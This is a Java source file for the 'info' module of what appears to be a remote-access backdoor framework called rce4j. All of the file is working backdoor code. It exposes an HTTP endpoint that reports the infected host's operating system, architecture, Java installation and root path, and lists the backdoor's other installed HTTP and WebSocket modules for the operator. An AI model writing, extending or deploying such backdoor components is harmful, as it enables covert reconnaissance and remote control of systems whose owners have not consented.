package org.rce4j.module.impl.http;

import net.chococaker.jjason.JsonArray;
import net.chococaker.jjason.JsonElement;
import net.chococaker.jjason.JsonObject;
import net.chococaker.jjason.JsonPrimitive;
import org.rce4j.module.BackdoorHttpModule;
import org.rce4j.module.BackdoorModule;
import org.rce4j.module.BackdoorWsModule;
import org.rce4j.module.ModuleManager;
import org.rce4j.module.event.BackdoorEvent;
import org.rce4j.module.event.BackdoorHttpEvent;
import org.rce4j.module.event.BackdoorWsEvent;
import org.rce4j.module.ModuleSuite;
import org.rce4j.util.SystemInformation;

import java.util.function.Function;

public class InfoModule extends BackdoorHttpModule {
    public InfoModule() {
        super("info", "/info");
    }
    
    private static final JsonPrimitive OS_NAME      = new JsonPrimitive(SystemInformation.OS_NAME);
    private static final JsonPrimitive OS_VERSION   = new JsonPrimitive(SystemInformation.OS_VERSION);
    private static final JsonPrimitive OS_ARCH      = new JsonPrimitive(SystemInformation.OS_ARCH);
    private static final JsonPrimitive JAVA_VERSION = new JsonPrimitive(SystemInformation.JAVA_VERSION);
    private static final JsonPrimitive JAVA_HOME    = new JsonPrimitive(SystemInformation.JAVA_HOME);
    private static final JsonPrimitive ROOT         = new JsonPrimitive(SystemInformation.ROOT);
    
    @Override
    public void onGet(BackdoorHttpEvent event) {
        ModuleManager moduleManager = event.getServer().getModuleManager();
        
        JsonObject systemInfoJson = new JsonObject();
        systemInfoJson.set("rce-version", new JsonPrimitive("1.0"));
        
        // SystemInformation -> JsonObject
        systemInfoJson.set("os-name", OS_NAME);
        systemInfoJson.set("os-version", OS_VERSION);
        systemInfoJson.set("os-arch", OS_ARCH);
        systemInfoJson.set("java-version", JAVA_VERSION);
        systemInfoJson.set("java-home", JAVA_HOME);
        System.out.println(JAVA_HOME.toNonEscapedString() + " " + SystemInformation.JAVA_HOME);
        systemInfoJson.set("root", ROOT);
        
        Function<BackdoorModule<? extends BackdoorEvent>, JsonElement> moduleJsonConverter = m -> {
            JsonObject json = new JsonObject();
            
            json.set("name", new JsonPrimitive(m.getName()));
            json.set("endpoint", new JsonPrimitive(m.getPath().toString()));
            
            return json;
        };
        
        ModuleSuite<BackdoorHttpModule, BackdoorHttpEvent> httpModules = moduleManager.getHttpModules();
        JsonArray jsonHttpModules = new JsonArray();
        for (BackdoorModule<? extends BackdoorEvent> module : httpModules) {
            jsonHttpModules.add(moduleJsonConverter.apply(module));
        }
        
        ModuleSuite<BackdoorWsModule, BackdoorWsEvent> wsModules = moduleManager.getWsModules();
        JsonArray jsonWsModules = new JsonArray();
        for (BackdoorModule<? extends BackdoorEvent> module : wsModules) {
            jsonWsModules.add(moduleJsonConverter.apply(module));
        }
        
        systemInfoJson.set("httpModules", jsonHttpModules);
        systemInfoJson.set("wsModules", jsonWsModules);
        
        event.respondJson(systemInfoJson);
    }
}
